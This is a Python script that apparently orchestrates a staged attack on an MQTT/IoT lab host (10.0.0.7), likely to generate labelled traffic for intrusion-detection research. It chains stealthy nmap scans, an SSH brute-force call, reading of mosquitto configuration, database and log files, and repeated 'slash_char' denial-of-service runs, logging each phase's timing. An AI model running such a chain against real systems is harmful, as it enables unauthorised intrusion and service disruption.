import apts
import random
import time
import pickle
import pytz
from datetime import datetime


def main():
    experiments_details = []
    target = "10.0.0.7"
    attack_name = "slash_char"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr;sudo nmap -sS -T1 -Pn 192.168.1.0/24;sudo nmap -sS -T1  -Pn 192.168.0.0/24;sudo nmap  -sS -T1 -Pn 10.0.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, 1.0, command_list, attack_name, pause_commands=True,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 180))

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.initial_access(target, 1.1, command_list, attack_name, sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 120))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force(2.0, attack_name, 30)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 120))

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog;sudo /usr/bin/nmap -sS -T1 -Pn -p 1883,8883 10.0.0.0/24;sleep 20;sudo nmap -sS -T1 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24;sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, 3, command_list2, attack_name, pause_commands=True,
                                     sup_conclusion_pause=60, interval=3, start_pausing=5)
    experiments_details.append(experiment)

    # 3) SLASH CHAR DOS
    # ---------------------------------------------------------------------------------------------
    experiments = apts.slash_char(target, 4, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 5, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 6, 20)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, 7, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 8, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 9, 20)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, 10, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 11, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 12, 20)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, 13, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 14, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 15, 20)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, 16, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 17, 20)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, 18, 20)
    experiments_details.append(experiments)

    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": attack_name,
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
